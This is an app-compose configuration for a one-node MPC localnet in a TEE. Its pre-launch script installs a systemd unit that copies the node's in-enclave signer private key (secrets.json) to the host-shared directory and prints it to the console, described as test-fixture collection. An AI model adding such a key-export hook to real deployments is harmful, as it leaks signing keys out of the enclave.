name: mpc-localnet-one-node-1786102851
docker_compose_file:
version: '3.8'

services:
  launcher:
    image: nearone/mpc-launcher@sha256:5618a93a78c9ac9173e7ebf7c8af173bd675be6832a2f8c2a9a7149ac2678f54

    container_name: launcher

    environment:
      - PLATFORM=TEE
      - DOCKER_CONTENT_TRUST=1
      - DEFAULT_IMAGE_DIGEST=sha256:564a5aebc33495d5610626d23cb9e3da8e9d531d0edff9e38aa1ccaf059c15d3

    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /var/run/dstack.sock:/var/run/dstack.sock
      - /tapp:/tapp:ro
      - shared-volume:/mnt/shared:rw

    security_opt:
      - no-new-privileges:true

    read_only: true

    tmpfs:
      - /tmp

volumes:
  shared-volume:
    name: shared-volume
pre_launch_script:
#!/bin/sh
# Test-asset collection hook, sourced by the CVM's app-compose.sh before the
# node starts. The node generates its NEAR signer key in-enclave, so exporting
# that key is the only way to check the fixture keypair into the repo next to
# the quote it is bound to (near/mpc #3787).
#
# The key appears only after the node starts, i.e. after this hook returns, so
# the wait runs as its own systemd unit: a plain background process would be
# reaped with app-compose.service's cgroup. The copy target is the CVM's
# host-shared dir, which the host sees as run/vm/<id>/shared/.
#
# The guest userland is BusyBox, so the wait loop sticks to shell built-ins and
# globs (no find/head, whose GNU options BusyBox rejects).
#
# Only ever use this on a throwaway localnet CVM: it exports a private key.

CONSOLE=/dev/console
SHARED=/dstack/.host-shared
EXFIL=/etc/fixture-exfil.sh

cat > "$EXFIL" <<'EOF'
#!/bin/sh
CONSOLE=/dev/console
SHARED=/dstack/.host-shared
i=0
while [ "$i" -lt 900 ]; do
  for f in /var/lib/docker/volumes/*/_data/secrets.json; do
    if [ -f "$f" ]; then
      cp "$f" "$SHARED/fixture-secrets.json" 2>/dev/null
      {
        echo "FIXTURE-SECRETS-BEGIN $f"
        cat "$f"
        echo ""
        echo "FIXTURE-SECRETS-END"
      } > "$CONSOLE" 2>&1
      exit 0
    fi
  done
  i=$((i + 1))
  sleep 2
done
echo "FIXTURE-SECRETS-TIMEOUT" > "$CONSOLE" 2>&1
EOF
chmod +x "$EXFIL" 2>/dev/null

cat > /etc/systemd/system/fixture-exfil.service <<'EOF'
[Unit]
Description=Export the MPC node signer key for test-asset collection
[Service]
Type=oneshot
ExecStart=/bin/sh /etc/fixture-exfil.sh
StandardOutput=journal+console
StandardError=journal+console
EOF

systemctl daemon-reload >/dev/null 2>&1
systemctl start --no-block fixture-exfil.service >/dev/null 2>&1

{
  echo "FIXTURE-DIAG-BEGIN"
  echo "exfil_script=$([ -f "$EXFIL" ] && echo present || echo missing)"
  echo "unit_state=$(systemctl is-active fixture-exfil.service 2>&1)"
  echo "shared_writable=$([ -w "$SHARED" ] && echo yes || echo no)"
  echo "FIXTURE-DIAG-END"
} > "$CONSOLE" 2>&1
